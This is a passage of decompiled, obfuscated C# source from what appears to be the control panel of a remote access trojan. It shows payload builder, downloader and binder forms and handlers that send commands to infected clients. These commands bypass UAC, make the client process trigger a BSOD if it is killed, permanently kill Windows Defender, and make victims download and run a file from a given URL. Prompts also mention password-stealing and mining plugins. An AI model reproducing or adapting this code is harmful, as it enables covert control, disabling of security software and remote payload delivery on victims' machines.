		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O6J*?86(", object_);
	}

	// Token: 0x060013D7 RID: 5079 RVA: 0x000A11D4 File Offset: 0x0009F3D4
	private void method_116(object sender, EventArgs e)
	{
		if (!Class130.fConnectionLog_0.Visible)
		{
			Class130.fConnectionLog_0.Show();
		}
		Form fConnectionLog_ = Class130.fConnectionLog_0;
		bool flag = false;
		Form form = fConnectionLog_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fConnectionLog_0.method_0();
			Class130.fConnectionLog_0.Activate();
		}
	}

	// Token: 0x060013D8 RID: 5080 RVA: 0x000A1288 File Offset: 0x0009F488
	public void method_117(int int_1)
	{
		switch (int_1)
		{
		case 1:
			this.vmethod_238().Checked = false;
			this.vmethod_236().Checked = true;
			this.vmethod_240().Checked = false;
			this.vmethod_242().Checked = false;
			this.vmethod_234().Checked = false;
			this.vmethod_232().Checked = false;
			break;
		case 2:
			this.vmethod_238().Checked = true;
			this.vmethod_236().Checked = false;
			this.vmethod_240().Checked = false;
			this.vmethod_242().Checked = false;
			this.vmethod_234().Checked = false;
			this.vmethod_232().Checked = false;
			break;
		case 3:
			this.vmethod_238().Checked = false;
			this.vmethod_236().Checked = false;
			this.vmethod_240().Checked = false;
			this.vmethod_242().Checked = false;
			this.vmethod_234().Checked = false;
			this.vmethod_232().Checked = true;
			break;
		case 4:
			this.vmethod_238().Checked = false;
			this.vmethod_236().Checked = false;
			this.vmethod_240().Checked = true;
			this.vmethod_242().Checked = false;
			this.vmethod_234().Checked = false;
			this.vmethod_232().Checked = false;
			break;
		case 5:
			this.vmethod_238().Checked = false;
			this.vmethod_236().Checked = false;
			this.vmethod_240().Checked = false;
			this.vmethod_242().Checked = true;
			this.vmethod_234().Checked = false;
			this.vmethod_232().Checked = false;
			break;
		case 6:
			this.vmethod_238().Checked = false;
			this.vmethod_236().Checked = false;
			this.vmethod_240().Checked = false;
			this.vmethod_242().Checked = false;
			this.vmethod_234().Checked = true;
			this.vmethod_232().Checked = false;
			break;
		}
		Class135.smethod_0().LayoutTheme = int_1;
		Class135.smethod_0().Save();
		switch (int_1)
		{
		case 1:
			Class145.smethod_3().method_28().vmethod_0().LoadVisualStyle(Application.StartupPath + "\\data\\media\\skins\\Luna.vssf");
			break;
		case 2:
			Class145.smethod_3().method_28().vmethod_0().LoadVisualStyle(Application.StartupPath + "\\data\\media\\skins\\AA.vssf");
			break;
		case 3:
			Class145.smethod_3().method_28().vmethod_0().LoadVisualStyle(Application.StartupPath + "\\data\\media\\skins\\BlueX1.vssf");
			break;
		case 4:
			Class145.smethod_3().method_28().vmethod_0().LoadVisualStyle(Application.StartupPath + "\\data\\media\\skins\\OSXT.vssf");
			break;
		case 5:
			Class145.smethod_3().method_28().vmethod_0().LoadVisualStyle(Application.StartupPath + "\\data\\media\\skins\\O2K10.vssf");
			break;
		case 6:
			Class145.smethod_3().method_28().vmethod_0().LoadVisualStyle(Application.StartupPath + "\\data\\media\\skins\\Lakrits.vssf");
			break;
		}
		Class145.smethod_3().method_28().vmethod_0().DoubleBufferForms = true;
	}

	// Token: 0x060013D9 RID: 5081 RVA: 0x0000AA8F File Offset: 0x00008C8F
	private void method_118(object sender, EventArgs e)
	{
		this.method_117(1);
	}

	// Token: 0x060013DA RID: 5082 RVA: 0x0000AA98 File Offset: 0x00008C98
	private void method_119(object sender, EventArgs e)
	{
		this.method_117(2);
	}

	// Token: 0x060013DB RID: 5083 RVA: 0x0000AAA1 File Offset: 0x00008CA1
	private void method_120(object sender, EventArgs e)
	{
		this.method_117(3);
	}

	// Token: 0x060013DC RID: 5084 RVA: 0x0000AAAA File Offset: 0x00008CAA
	private void method_121(object sender, EventArgs e)
	{
		this.method_117(4);
	}

	// Token: 0x060013DD RID: 5085 RVA: 0x0000AAB3 File Offset: 0x00008CB3
	private void method_122(object sender, EventArgs e)
	{
		this.method_117(5);
	}

	// Token: 0x060013DE RID: 5086 RVA: 0x0000AABC File Offset: 0x00008CBC
	private void method_123(object sender, EventArgs e)
	{
		this.method_117(6);
	}

	// Token: 0x060013DF RID: 5087 RVA: 0x000A15B8 File Offset: 0x0009F7B8
	private void method_124(object sender, EventArgs e)
	{
		checked
		{
			if (Class130.fOnJoin_0.vmethod_8().InvokeRequired)
			{
				Class130.fOnJoin_0.vmethod_8().Invoke(new fMain.Delegate132(this.method_52), new object[0]);
			}
			else
			{
				try
				{
					Class130.fOnJoin_0.Visible = true;
					Form fOnJoin_ = Class130.fOnJoin_0;
					bool flag = false;
					Form form = fOnJoin_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fOnJoin_0.Opacity = 100.0;
					Class130.fOnJoin_0.Activate();
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x060013E0 RID: 5088 RVA: 0x0000AAC5 File Offset: 0x00008CC5
	private void fMain_Resize(object sender, EventArgs e)
	{
		this.vmethod_18().Width = checked(base.Width - 8);
	}

	// Token: 0x060013E1 RID: 5089 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_125(object sender, EventArgs e)
	{
	}

	// Token: 0x060013E2 RID: 5090 RVA: 0x000A16C4 File Offset: 0x0009F8C4
	private void method_126(object sender, EventArgs e)
	{
		if (!Class130.fBuilder_0.Visible)
		{
			Class130.fBuilder_0.Show();
		}
		Form fBuilder_ = Class130.fBuilder_0;
		bool flag = true;
		Form form = fBuilder_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fBuilder_0.method_0();
			Class130.fBuilder_0.Activate();
		}
	}

	// Token: 0x060013E3 RID: 5091 RVA: 0x000A1778 File Offset: 0x0009F978
	private void method_127(object sender, EventArgs e)
	{
		if (!Class130.fBuilderDownloader_0.Visible)
		{
			Class130.fBuilderDownloader_0.Show();
		}
		Form fBuilderDownloader_ = Class130.fBuilderDownloader_0;
		bool flag = true;
		Form form = fBuilderDownloader_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fBuilderDownloader_0.method_0();
			Class130.fBuilderDownloader_0.Activate();
		}
	}

	// Token: 0x060013E4 RID: 5092 RVA: 0x000A182C File Offset: 0x0009FA2C
	private void method_128(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("This will attempt to gain administrative privileges by means of bypassing UAC on Windows 10 systems and protect the process and cause a BSOD if killed.\r\nThe selected client(s) will reconnect if the process protect succeeds.", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "prc_protect|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013E5 RID: 5093 RVA: 0x000A1954 File Offset: 0x0009FB54
	private void method_129(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("This will attempt to gain administrative privileges by means of bypassing UAC on Windows 10 systems and kill Windows Defender.\r\n\r\nWARNING: THIS ACTION IS IRREVERSIBLE!\r\n" + Application.ProductName + " WILL NOT BE ABLE TO RESTORE WINDOWS DEFENDER ONCE KILLED.\r\n\r\nAre you sure you wish to proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "wd_kill|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013E6 RID: 5094 RVA: 0x000A1A88 File Offset: 0x0009FC88
	private void method_130(object sender, EventArgs e)
	{
		if (!Class130.fBuilderBinder_0.Visible)
		{
			Class130.fBuilderBinder_0.Show();
		}
		Form fBuilderBinder_ = Class130.fBuilderBinder_0;
		bool flag = true;
		Form form = fBuilderBinder_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fBuilderBinder_0.method_2();
			Class130.fBuilderBinder_0.Activate();
		}
	}

	// Token: 0x060013E7 RID: 5095 RVA: 0x000A1B3C File Offset: 0x0009FD3C
	private void method_131(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter URL to file", Application.ProductName, string.Empty, -1, -1);
		int num = (Operators.CompareString(text, string.Empty, true) == 0 | text.Length > 2048) ? 1 : 0;
		ref string ptr = ref text;
		int num2 = num;
		bool flag = false & Strings.LCase(ptr).StartsWith("https");
		if (ptr.ToLower().StartsWith("www."))
		{
			ptr = "http://" + ptr;
		}
		bool flag2 = Regex.IsMatch(ptr, "http(s)?://([\\w+?\\.\\w+])+([a-zA-Z0-9\\~\\!\\@\\#\\$\\%\\^\\&\\*\\(\\)_\\-\\=\\+\\\\\\/\\?\\.\\:\\;\\'\\,]*)?");
		bool flag3 = flag2;
		if ((num2 | ((!flag3) ? 1 : 0)) != 0)
		{
			Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "cli_up|" + text;
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013E8 RID: 5096 RVA: 0x000A1CD8 File Offset: 0x0009FED8
	private void method_132(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show("This will attempt to gain administrative privileges by means of bypassing UAC on Windows 10 systems.\r\nThe selected client(s) will reconnect if the exploitation succeeds.\r\n\r\nWARNING: All plugins, such as passwords, mining, etc. may not work properly until the client exe is restarted, i.e. after a reboot.", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "uac_bypass|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013EB RID: 5099 RVA: 0x0000AADA File Offset: 0x00008CDA
	internal StatusStrip vmethod_4()
	{
		return this.statusStrip_0;
	}

	// Token: 0x060013EC RID: 5100 RVA: 0x0000AAE2 File Offset: 0x00008CE2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x060013ED RID: 5101 RVA: 0x0000AAEB File Offset: 0x00008CEB
	internal ToolStripStatusLabel vmethod_6()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x060013EE RID: 5102 RVA: 0x0000AAF3 File Offset: 0x00008CF3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_5;
	}

	// Token: 0x060013EF RID: 5103 RVA: 0x0000AAFC File Offset: 0x00008CFC
	internal ToolStripStatusLabel vmethod_8()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x060013F0 RID: 5104 RVA: 0x0000AB04 File Offset: 0x00008D04
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_5;
	}

	// Token: 0x060013F1 RID: 5105 RVA: 0x0000AB0D File Offset: 0x00008D0D
	internal ToolStripStatusLabel vmethod_10()
	{
		return this.toolStripStatusLabel_2;
	}

	// Token: 0x060013F2 RID: 5106 RVA: 0x0000AB15 File Offset: 0x00008D15
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_2 = toolStripStatusLabel_5;
	}

	// Token: 0x060013F3 RID: 5107 RVA: 0x0000AB1E File Offset: 0x00008D1E
	internal ToolStripStatusLabel vmethod_12()
	{
		return this.toolStripStatusLabel_3;
	}

	// Token: 0x060013F4 RID: 5108 RVA: 0x0000AB26 File Offset: 0x00008D26
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_3 = toolStripStatusLabel_5;
	}

	// Token: 0x060013F5 RID: 5109 RVA: 0x0000AB2F File Offset: 0x00008D2F
	internal ToolStripStatusLabel vmethod_14()
	{
		return this.toolStripStatusLabel_4;
	}

	// Token: 0x060013F6 RID: 5110 RVA: 0x0000AB37 File Offset: 0x00008D37
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_4 = toolStripStatusLabel_5;
	}

	// Token: 0x060013F7 RID: 5111 RVA: 0x0000AB40 File Offset: 0x00008D40
	internal ToolStripProgressBar vmethod_16()
	{
		return this.toolStripProgressBar_0;
	}

	// Token: 0x060013F8 RID: 5112 RVA: 0x0000AB48 File Offset: 0x00008D48
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripProgressBar toolStripProgressBar_1)
	{
		this.toolStripProgressBar_0 = toolStripProgressBar_1;
	}

	// Token: 0x060013F9 RID: 5113 RVA: 0x0000AB51 File Offset: 0x00008D51
	internal FastObjectListView vmethod_18()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x060013FA RID: 5114 RVA: 0x000A49A8 File Offset: 0x000A2BA8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(FastObjectListView fastObjectListView_1)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_43);
		EventHandler<CreateGroupsEventArgs> eventHandler = new EventHandler<CreateGroupsEventArgs>(this.method_44);
		ColumnClickEventHandler value2 = new ColumnClickEventHandler(this.method_46);
		MouseEventHandler value3 = new MouseEventHandler(this.method_62);
		MouseEventHandler value4 = new MouseEventHandler(this.method_64);
		EventHandler value5 = new EventHandler(this.method_70);
		EventHandler<FormatCellEventArgs> eventHandler2 = new EventHandler<FormatCellEventArgs>(this.method_71);
		EventHandler<FormatRowEventArgs> eventHandler3 = new EventHandler<FormatRowEventArgs>(this.method_107);
		EventHandler value6 = new EventHandler(this.method_125);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.MouseUp -= value;
			fastObjectListView.AboutToCreateGroups -= eventHandler;
			fastObjectListView.ColumnClick -= value2;
			fastObjectListView.MouseMove -= value3;
			fastObjectListView.MouseDown -= value4;
			fastObjectListView.DoubleClick -= value5;
			fastObjectListView.FormatCell -= eventHandler2;
			fastObjectListView.FormatRow -= eventHandler3;
			fastObjectListView.SelectedIndexChanged -= value6;
		}
		this.fastObjectListView_0 = fastObjectListView_1;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.MouseUp += value;
			fastObjectListView.AboutToCreateGroups += eventHandler;
			fastObjectListView.ColumnClick += value2;
			fastObjectListView.MouseMove += value3;
			fastObjectListView.MouseDown += value4;
			fastObjectListView.DoubleClick += value5;
			fastObjectListView.FormatCell += eventHandler2;
			fastObjectListView.FormatRow += eventHandler3;
			fastObjectListView.SelectedIndexChanged += value6;
		}
	}

	// Token: 0x060013FB RID: 5115 RVA: 0x0000AB59 File Offset: 0x00008D59
	internal OLVColumn vmethod_20()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x060013FC RID: 5116 RVA: 0x0000AB61 File Offset: 0x00008D61
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_0 = olvcolumn_19;
	}

	// Token: 0x060013FD RID: 5117 RVA: 0x0000AB6A File Offset: 0x00008D6A
	internal OLVColumn vmethod_22()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x060013FE RID: 5118 RVA: 0x0000AB72 File Offset: 0x00008D72
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_1 = olvcolumn_19;
	}

	// Token: 0x060013FF RID: 5119 RVA: 0x0000AB7B File Offset: 0x00008D7B
	internal OLVColumn vmethod_24()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x06001400 RID: 5120 RVA: 0x0000AB83 File Offset: 0x00008D83
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_2 = olvcolumn_19;
	}

	// Token: 0x06001401 RID: 5121 RVA: 0x0000AB8C File Offset: 0x00008D8C
	internal OLVColumn vmethod_26()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x06001402 RID: 5122 RVA: 0x0000AB94 File Offset: 0x00008D94
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_3 = olvcolumn_19;
	}

	// Token: 0x06001403 RID: 5123 RVA: 0x0000AB9D File Offset: 0x00008D9D
	internal OLVColumn vmethod_28()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x06001404 RID: 5124 RVA: 0x0000ABA5 File Offset: 0x00008DA5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_4 = olvcolumn_19;
	}

	// Token: 0x06001405 RID: 5125 RVA: 0x0000ABAE File Offset: 0x00008DAE
	internal OLVColumn vmethod_30()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x06001406 RID: 5126 RVA: 0x0000ABB6 File Offset: 0x00008DB6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_5 = olvcolumn_19;
	}

	// Token: 0x06001407 RID: 5127 RVA: 0x0000ABBF File Offset: 0x00008DBF
	internal OLVColumn vmethod_32()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x06001408 RID: 5128 RVA: 0x0000ABC7 File Offset: 0x00008DC7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_6 = olvcolumn_19;
	}

	// Token: 0x06001409 RID: 5129 RVA: 0x0000ABD0 File Offset: 0x00008DD0
	internal OLVColumn vmethod_34()
	{
		return this.olvcolumn_7;
	}

	// Token: 0x0600140A RID: 5130 RVA: 0x0000ABD8 File Offset: 0x00008DD8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_7 = olvcolumn_19;
	}

	// Token: 0x0600140B RID: 5131 RVA: 0x0000ABE1 File Offset: 0x00008DE1
	internal OLVColumn vmethod_36()
	{
		return this.olvcolumn_8;
	}

	// Token: 0x0600140C RID: 5132 RVA: 0x0000ABE9 File Offset: 0x00008DE9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_8 = olvcolumn_19;
	}

	// Token: 0x0600140D RID: 5133 RVA: 0x0000ABF2 File Offset: 0x00008DF2
	internal OLVColumn vmethod_38()
	{
		return this.olvcolumn_9;
	}

	// Token: 0x0600140E RID: 5134 RVA: 0x0000ABFA File Offset: 0x00008DFA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_9 = olvcolumn_19;
	}

	// Token: 0x0600140F RID: 5135 RVA: 0x0000AC03 File Offset: 0x00008E03
	internal OLVColumn vmethod_40()
	{
		return this.olvcolumn_10;
	}

	// Token: 0x06001410 RID: 5136 RVA: 0x0000AC0B File Offset: 0x00008E0B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_10 = olvcolumn_19;
	}

	// Token: 0x06001411 RID: 5137 RVA: 0x0000AC14 File Offset: 0x00008E14
	internal OLVColumn vmethod_42()
	{
		return this.olvcolumn_11;
	}

	// Token: 0x06001412 RID: 5138 RVA: 0x0000AC1C File Offset: 0x00008E1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_11 = olvcolumn_19;
	}

	// Token: 0x06001413 RID: 5139 RVA: 0x0000AC25 File Offset: 0x00008E25
	internal ContextMenuStrip vmethod_44()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06001414 RID: 5140 RVA: 0x0000AC2D File Offset: 0x00008E2D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06001415 RID: 5141 RVA: 0x0000AC36 File Offset: 0x00008E36
	internal ToolStripMenuItem vmethod_46()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06001416 RID: 5142 RVA: 0x0000AC3E File Offset: 0x00008E3E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_0 = toolStripMenuItem_66;
	}

	// Token: 0x06001417 RID: 5143 RVA: 0x0000AC47 File Offset: 0x00008E47
	internal ToolStripMenuItem vmethod_48()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06001418 RID: 5144 RVA: 0x0000AC4F File Offset: 0x00008E4F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_1 = toolStripMenuItem_66;
	}

	// Token: 0x06001419 RID: 5145 RVA: 0x0000AC58 File Offset: 0x00008E58
	internal ToolStripMenuItem vmethod_50()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x0600141A RID: 5146 RVA: 0x000A4AD8 File Offset: 0x000A2CD8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_45);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600141B RID: 5147 RVA: 0x0000AC60 File Offset: 0x00008E60
	internal ToolStripMenuItem vmethod_52()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x0600141C RID: 5148 RVA: 0x0000AC68 File Offset: 0x00008E68
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_3 = toolStripMenuItem_66;
	}

	// Token: 0x0600141D RID: 5149 RVA: 0x0000AC71 File Offset: 0x00008E71
	internal ToolStripMenuItem vmethod_54()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x0600141E RID: 5150 RVA: 0x000A4B1C File Offset: 0x000A2D1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_47);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600141F RID: 5151 RVA: 0x0000AC79 File Offset: 0x00008E79
	internal ToolStripMenuItem vmethod_56()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x06001420 RID: 5152 RVA: 0x000A4B60 File Offset: 0x000A2D60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_48);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_5 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001421 RID: 5153 RVA: 0x0000AC81 File Offset: 0x00008E81
	internal ToolStripMenuItem vmethod_58()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x06001422 RID: 5154 RVA: 0x0000AC89 File Offset: 0x00008E89
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_6 = toolStripMenuItem_66;
	}

	// Token: 0x06001423 RID: 5155 RVA: 0x0000AC92 File Offset: 0x00008E92
	internal ToolStripMenuItem vmethod_60()
	{
		return this.toolStripMenuItem_7;
	}

	// Token: 0x06001424 RID: 5156 RVA: 0x000A4BA4 File Offset: 0x000A2DA4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_49);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_7 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001425 RID: 5157 RVA: 0x0000AC9A File Offset: 0x00008E9A
	internal ToolStripSeparator vmethod_62()
	{
		return this.toolStripSeparator_0;
	}

